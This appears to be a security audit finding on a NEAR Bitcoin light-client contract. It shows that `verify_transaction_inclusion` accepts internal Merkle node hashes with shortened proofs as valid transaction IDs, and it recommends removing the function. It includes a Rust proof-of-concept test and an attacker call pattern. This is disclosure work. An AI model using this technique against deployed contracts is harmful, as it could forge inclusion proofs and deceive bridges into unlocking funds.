### Title
Merkle Second-Preimage Attack: `verify_transaction_inclusion` Accepts Internal Node Hashes as Valid Transaction IDs — (`contract/src/lib.rs`, `merkle-tools/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion` is a public, unpermissioned NEAR view/call that performs no proof-depth validation. Any caller can supply an internal Merkle tree node hash as `tx_id` with a proof shorter than the actual tree depth, causing the function to reconstruct the correct Merkle root and return `true` — falsely asserting that a non-existent transaction was included in a canonical block.

---

### Finding Description

`compute_root_from_merkle_proof` iterates unconditionally over whatever `merkle_proof` slice is provided, with no check that `merkle_proof.len()` equals `ceil(log2(n))` for the block's actual transaction count: [1](#0-0) 

`verify_transaction_inclusion` passes the caller-supplied `args.merkle_proof` directly to that function. Its only guard is `!args.merkle_proof.is_empty()` — there is no bound on proof length, no transaction-count check, and no tree-depth validation: [2](#0-1) 

The function is public (`pub fn`), not `#[private]`, and only gated by `#[pause]` (inactive by default): [3](#0-2) 

The codebase itself acknowledges the attack surface explicitly: [4](#0-3) [5](#0-4) 

---

### Impact Explanation

For a 4-leaf tree `[L0, L1, L2, L3]`:

- `I01 = H(L0, L1)`, `I23 = H(L2, L3)`, `root = H(I01, I23)`
- Attacker calls `verify_transaction_inclusion({ tx_id: I01, tx_index: 0, merkle_proof: [I23], ... })`
- `compute_root_from_merkle_proof(I01, 0, [I23])` computes `H(I01, I23) == root` → returns `true`
- `I01` is an internal node, not a leaf transaction; no such transaction exists in the block

Any downstream consumer (bridge, oracle, cross-chain protocol) that trusts the `true` return value to authorize an action (token unlock, event relay, etc.) can be deceived into processing a fabricated event anchored to a real canonical block.

---

### Likelihood Explanation

- The function is callable by any unprivileged NEAR account with no role check.
- The attacker only needs knowledge of any two sibling leaf hashes from a block already stored in `headers_pool` — all of which are public Bitcoin blockchain data.
- No special privileges, key compromise, or social engineering is required.
- The deprecated status does not remove the function from the deployed contract; it remains callable.

---

### Recommendation

1. **Remove `verify_transaction_inclusion` (v1) entirely** from the deployed contract, or add an on-chain `#[private]` restriction so it cannot be called externally. Deprecation alone does not prevent exploitation.
2. For `verify_transaction_inclusion_v2`, the equal-length coinbase proof constraint (`merkle_proof.len() == coinbase_merkle_proof.len()`) does constrain the attacker's proof depth to match the coinbase proof depth, which partially mitigates the attack for v2. However, v1 remains fully exploitable.
3. If proof-depth validation is desired on-chain, the block header would need to encode the transaction count — which standard Bitcoin headers do not. The practical fix is removal of v1.

---

### Proof of Concept

```rust
// Rust unit test (no NEAR runtime needed)
use merkle_tools::{compute_root_from_merkle_proof, H256, double_sha256};

fn compute_hash(a: &H256, b: &H256) -> H256 {
    let mut v = Vec::with_capacity(64);
    v.extend(a.0); v.extend(b.0);
    double_sha256(&v)
}

#[test]
fn internal_node_second_preimage() {
    // 4 arbitrary leaf hashes
    let l0: H256 = "0000...01".parse().unwrap();
    let l1: H256 = "0000...02".parse().unwrap();
    let l2: H256 = "0000...03".parse().unwrap();
    let l3: H256 = "0000...04".parse().unwrap();

    let i01 = compute_hash(&l0, &l1);   // internal node, depth 1
    let i23 = compute_hash(&l2, &l3);   // internal node, depth 1
    let root = compute_hash(&i01, &i23); // real merkle root

    // Attacker uses internal node i01 as "tx_id" with a 1-element proof
    let computed = compute_root_from_merkle_proof(i01.clone(), 0, &vec![i23]);
    assert_eq!(computed, root); // passes — i01 is NOT a leaf transaction
}
```

```rust
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
```

```rust
    #[pause]
    pub fn verify_transaction_inclusion(&self, #[serializer(borsh)] args: ProofArgs) -> bool {
        require!(
            args.confirmations <= self.gc_threshold,
            "The required number of confirmations exceeds the number of blocks stored in memory"
        );

        let heaviest_block_header = self
            .headers_pool
            .get(&self.mainchain_tip_blockhash)
            .unwrap_or_else(|| env::panic_str(ERR_KEY_NOT_EXIST));
        let target_block_height = self
            .mainchain_header_to_height
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("block does not belong to the current main chain"));

        // Check requested confirmations. No need to compute proof if insufficient confirmations.
        require!(
            (heaviest_block_header.block_height).saturating_sub(target_block_height) + 1
                >= args.confirmations,
            "Not enough blocks confirmed"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(!args.merkle_proof.is_empty(), "Merkle proof is empty");

        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
    }
```
